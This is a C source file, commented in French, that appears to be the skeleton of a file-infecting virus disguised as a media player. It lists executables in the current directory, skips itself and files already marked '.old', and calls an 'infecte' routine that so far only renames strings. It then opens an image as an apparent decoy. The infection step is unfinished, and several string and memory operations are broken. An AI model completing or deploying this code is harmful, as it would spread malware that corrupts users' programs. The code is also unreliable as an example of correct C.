#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>

char** getFiles();
void infecte(char** f);
bool dejaInfecte(char* f);

char** getFiles(){
    char** files = malloc(5*sizeof(char*));
    int cpt = 0;
    DIR *repertoire = opendir(".");
    struct stat statsF;
    struct dirent *lecture;
    printf("Liste des fichiers exécutables : \n");
    while((lecture = readdir(repertoire))){
        /**
         * Lecture du répertoire
         */
        if ((stat(lecture->d_name, &statsF) == 0) && ((statsF.st_mode & S_IFMT) == S_IFREG) && (statsF.st_mode & S_IXUSR)) {
            /**
             * Si le fichier est exécutable et régulier
             */
            if (cpt<5 && (strcmp(lecture->d_name, "MediaPlayer.exe") != 0) && !dejaInfecte(lecture->d_name)) {
                /**
                 * Si l'exécutable n'est pas le media player et qu'il n'a pas déjà été infecté
                 */
                printf("- %s\n", lecture->d_name);
                files[cpt] = lecture->d_name;
                cpt++;
            }

        }

    }
    closedir(repertoire);
    return files;
}


void infecte(char** f){
    for(int i = 0; i < 5; i++)
    {
		FILE *oldFile;
		FILE *newFile;
		char* currentFile = f[i];
		strcat(currentFile, ".old");
		printf("%s\n", currentFile);
    }

}


bool dejaInfecte(char* f){
    char* extension = ".old";
    if (strstr(f, extension) != NULL) {
        /**
         * Le fichier en paramètres ne possède pas l'extension .old
        */
        return true;
    } else{
        DIR* repertoire = opendir(".");
        struct dirent *lecture;
        while((lecture = readdir(repertoire))){
            if ((strcmp(lecture->d_name, f) == 0) && (fopen(strcat(lecture->d_name, extension), "r") != NULL)) {
                /**
                * Le fichier lu dans le répertoire et le fichier en paramètre sont les mêmes
                * Le fichier lu avec l'extension .old a été ouvert
                * Donc le fichier est infecté
                 */
                return true;
            }
        }
    }
    return false;
}

int main(int argc, char const *argv[])
{
    char** files = getFiles();
    infecte(files);
    system("xdg-open ../img/img1.jpg");
    return EXIT_SUCCESS;
}
